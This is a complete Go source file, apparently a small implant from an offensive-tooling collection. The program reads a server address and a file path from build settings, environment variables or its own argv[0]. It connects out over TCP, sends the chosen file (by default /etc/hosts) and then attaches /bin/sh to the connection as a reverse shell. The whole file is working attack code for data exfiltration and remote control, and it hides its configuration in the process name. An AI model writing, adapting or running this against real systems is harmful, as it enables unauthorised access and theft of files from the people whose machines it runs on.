// Program argv_from_argv0 - argv_from_file_descriptor but parses argv[0] into
// the config.
package main

/*
 * argv_from_argv0.go
 * argv_from_file_descriptor, but uses argv0 instead
 * By J. Stuart McMurray
 * Created 20240902
 * Last Modified 20240906
 */

import (
	"cmp"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
)

// Compile-time configurables
var (
	Address       = "localhost:4444"
	AddressEnvVar = "ALPT4ATS_ADDRESS"
	File          = "/etc/hosts"
	FileEnvVar    = "ALPT4ATS_FILE"
)

func main() {
	/* Config from environment overrides compile-time config. */
	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)
	File = cmp.Or(os.Getenv(FileEnvVar), File)

	/* Config from argv[0] overrides config from environment. */
	if _, err := fmt.Fscan(
		strings.NewReader(os.Args[0]),
		&Address,
		&File,
	); nil != err && !errors.Is(err, io.EOF) {
		log.Fatalf(
			"Error reading config from argv[0] (%q): %s",
			os.Args[0],
			err,
		)
	}

	/* Connect to the server. */
	c, err := net.Dial("tcp", Address)
	if nil != err {
		log.Fatalf("Error connecting to server: %s", err)
	}

	/* Send back the file. */
	b, err := os.ReadFile(File)
	if nil != err {
		log.Fatalf("Error reading file: %s", err)
	}
	if _, err := c.Write(b); nil != err {
		log.Printf("Error sending file: %s", err)
	}

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = c
	sh.Stdout = c
	sh.Stderr = c
	if err := sh.Run(); nil != err {
		log.Fatalf("Shell died: %s", err)
	}
}
